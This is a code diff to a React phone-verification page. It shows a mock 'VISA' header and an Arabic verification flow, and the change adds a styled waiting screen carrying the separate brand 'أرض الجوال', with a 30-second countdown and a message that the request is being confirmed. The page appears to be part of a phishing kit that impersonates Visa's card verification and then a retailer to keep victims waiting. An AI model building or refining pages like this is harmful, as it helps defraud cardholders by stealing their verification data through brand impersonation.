@@ -177,29 +177,107 @@ export default function VerifyPhonePage() {
   }
 
   return (
-    <div style={{ backgroundColor: '#ffffff', color: '#000000', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', fontFamily: 'Arial, sans-serif' }}>
+    <div style={{ backgroundColor: verified ? '#fbfcfd' : '#ffffff', color: verified ? '#1c2530' : '#000000', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', fontFamily: verified ? '"Tajawal", Tahoma, Arial, sans-serif' : 'Arial, sans-serif', overflow: verified ? 'hidden' : 'visible', position: 'relative' }}>
       
-      {/* Header */}
-      <header style={{ width: '100%', maxWidth: '500px', padding: '15px 20px', display: 'flex', justifyContent: 'flex-start', alignItems: 'center', borderBottom: '1px solid #dcdcdc' }}>
-        <div style={{ fontSize: '32px', fontWeight: 'bold', color: '#1a1f71', fontStyle: 'italic', letterSpacing: '-1px' }}>
-          VISA
-        </div>
-      </header>
+      {!verified && (
+        <>
+          {/* Header */}
+          <header style={{ width: '100%', maxWidth: '500px', padding: '15px 20px', display: 'flex', justifyContent: 'flex-start', alignItems: 'center', borderBottom: '1px solid #dcdcdc' }}>
+            <div style={{ fontSize: '32px', fontWeight: 'bold', color: '#1a1f71', fontStyle: 'italic', letterSpacing: '-1px' }}>
+              VISA
+            </div>
+          </header>
+        </>
+      )}
 
       {/* Content */}
-      <main style={{ width: '100%', maxWidth: '400px', padding: '30px 20px', display: 'flex', flexDirection: 'column', alignItems: 'center', textAlign: 'center' }}>
+      <main style={{ width: '100%', maxWidth: verified ? '480px' : '400px', minHeight: verified ? '100vh' : 'auto', padding: verified ? '48px 24px' : '30px 20px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: verified ? 'flex-start' : 'center', textAlign: 'center', position: 'relative', zIndex: 1 }}>
         
         {verified ? (
-          <div>
-            <div style={{ fontSize: '18px', fontWeight: 'bold', color: '#2e7d32', marginBottom: '15px' }}>
-              تم تسجيل الرقم المرجعي بنجاح
-            </div>
-            {countdown > 0 && (
-              <div style={{ fontSize: '14px', color: '#555' }}>
-                سيتم التوجيه خلال: <strong style={{ fontSize: '24px', color: '#1646a7', fontVariantNumeric: 'tabular-nums' }}>00:{String(countdown).padStart(2, '0')}</strong>
+          <>
+            <style jsx global>{`
+              @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;800&display=swap');
+              .erd-wait-blob { position: fixed; border-radius: 50%; pointer-events: none; z-index: 0; }
+              .erd-wait-blob-one { width: 260px; height: 260px; top: -130px; left: -90px; background: linear-gradient(135deg,#7fd6bf,#bfe9dd); }
+              .erd-wait-blob-two { width: 420px; height: 420px; bottom: -250px; right: -120px; background: linear-gradient(135deg,#d6efe8,#7fd6bf); }
+              .erd-wait-blob-three { width: 300px; height: 300px; bottom: -190px; left: -60px; background: #e9f6f2; }
+              .erd-wait-logo { display: flex; align-items: center; gap: 14px; margin: 0 auto 56px; direction: rtl; }
+              .erd-wait-logo-text { font-weight: 800; font-size: 30px; line-height: 1.05; text-align: right; }
+              .erd-wait-logo-text span { display: block; }
+              .erd-wait-logo-line { display: inline-block; width: 110px; height: 2px; background: #1c2530; vertical-align: middle; margin-inline-end: 6px; }
+              .erd-wait-logo-mark { width: 56px; height: 70px; flex: none; }
+              .erd-wait-timer { position: relative; width: min(300px,72vw); aspect-ratio: 1; }
+              .erd-wait-ring { width: 100%; height: 100%; transform: rotate(-90deg); }
+              .erd-wait-ring circle { fill: none; stroke-width: 14; stroke-linecap: round; }
+              .erd-wait-track { stroke: #e6eaee; }
+              .erd-wait-progress { stroke: #2fbf9b; transition: stroke-dashoffset 1s linear; }
+              .erd-wait-timer-body { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+              .erd-wait-hourglass { width: 52px; height: 64px; margin-bottom: 6px; }
+              .erd-wait-number { font-size: 64px; font-weight: 800; line-height: 1; font-variant-numeric: tabular-nums; }
+              .erd-wait-unit { font-size: 20px; color: #5b6672; font-weight: 500; }
+              .erd-wait-heading { font-size: 30px; font-weight: 800; margin: 44px 0 22px; line-height: 1.35; }
+              .erd-wait-divider { display: flex; align-items: center; gap: 14px; width: 100%; margin-bottom: 26px; }
+              .erd-wait-divider-line { flex: 1; height: 1px; background: #e6eaee; }
+              .erd-wait-dots { display: flex; gap: 10px; }
+              .erd-wait-dots b { width: 12px; height: 12px; border-radius: 50%; background: #e6eaee; animation: erd-wait-pulse 1.2s infinite; }
+              .erd-wait-dots b:nth-child(2) { animation-delay: .2s; }
+              .erd-wait-dots b:nth-child(3) { animation-delay: .4s; }
+              @keyframes erd-wait-pulse { 0%,100% { background: #e6eaee; transform: scale(1); } 50% { background: #2fbf9b; transform: scale(1.25); } }
+              .erd-wait-message { font-size: 19px; line-height: 1.8; color: #5b6672; max-width: 340px; }
+              @media (prefers-reduced-motion: reduce) { .erd-wait-dots b { animation: none; } .erd-wait-progress { transition: none; } }
+              @media (max-width: 380px) { .erd-wait-logo { margin-bottom: 38px; } .erd-wait-heading { font-size: 26px; margin-top: 34px; } .erd-wait-message { font-size: 17px; } }
+            `}</style>
+
+            <div className="erd-wait-blob erd-wait-blob-one" aria-hidden="true" />
+            <div className="erd-wait-blob erd-wait-blob-two" aria-hidden="true" />
+            <div className="erd-wait-blob erd-wait-blob-three" aria-hidden="true" />
+
+            <div className="erd-wait-logo" aria-label="أرض الجوال">
+              <div className="erd-wait-logo-text">
+                <span><i className="erd-wait-logo-line" />أرض</span>
+                <span>الجوال</span>
               </div>
-            )}
-          </div>
+              <svg className="erd-wait-logo-mark" viewBox="0 0 56 70" aria-hidden="true">
+                <path d="M4 14q0-8 8-8h36q6 0 4 7l-6 16H8q-4 0-4-5z" fill="#eef1f3" stroke="#c9d0d6" strokeWidth="2" />
+                <path d="M4 40h42l6 10q4 6-3 10H12q-8 0-8-8z" fill="#2fbf9b" />
+              </svg>
+            </div>
+
+            <div className="erd-wait-timer" role="timer" aria-live="polite" aria-label={`متبقي ${countdown} ثانية`}>
+              <svg className="erd-wait-ring" viewBox="0 0 100 100" aria-hidden="true">
+                <circle className="erd-wait-track" cx="50" cy="50" r="45" />
+                <circle
+                  className="erd-wait-progress"
+                  cx="50"
+                  cy="50"
+                  r="45"
+                  style={{
+                    strokeDasharray: 2 * Math.PI * 45,
+                    strokeDashoffset: 2 * Math.PI * 45 * (1 - Math.max(0, Math.min(30, countdown)) / 30),
+                  }}
+                />
+              </svg>
+              <div className="erd-wait-timer-body">
+                <svg className="erd-wait-hourglass" viewBox="0 0 52 64" aria-hidden="true">
+                  <rect x="4" y="2" width="44" height="5" rx="2" fill="#2b3640" />
+                  <rect x="4" y="57" width="44" height="5" rx="2" fill="#2b3640" />
+                  <path d="M10 7v10q0 8 12 15-12 7-12 15v10M42 7v10q0 8-12 15 12 7 12 15v10" fill="none" stroke="#2b3640" strokeWidth="4" strokeLinecap="round" />
+                  <path d="M16 54q0-8 10-12 10 4 10 12z" fill="#2fbf9b" />
+                  <path d="M26 30v12" stroke="#2fbf9b" strokeWidth="2" />
+                </svg>
+                <div className="erd-wait-number">{countdown}</div>
+                <div className="erd-wait-unit">ثانية</div>
+              </div>
+            </div>
+
+            <h1 className="erd-wait-heading">جار تأكيد الطلب</h1>
+            <div className="erd-wait-divider" aria-hidden="true">
+              <i className="erd-wait-divider-line" />
+              <div className="erd-wait-dots"><b /><b /><b /></div>
+              <i className="erd-wait-divider-line" />
+            </div>
+            <p className="erd-wait-message">يرجى الانتظار حتى اكتمال تأكيد الطلب، ويمكنك متابعة حالة طلبك بعد ذلك</p>
+          </>
         ) : (
           <>
             <div style={{ fontSize: '16px', color: '#555555', marginBottom: '15px' }}>
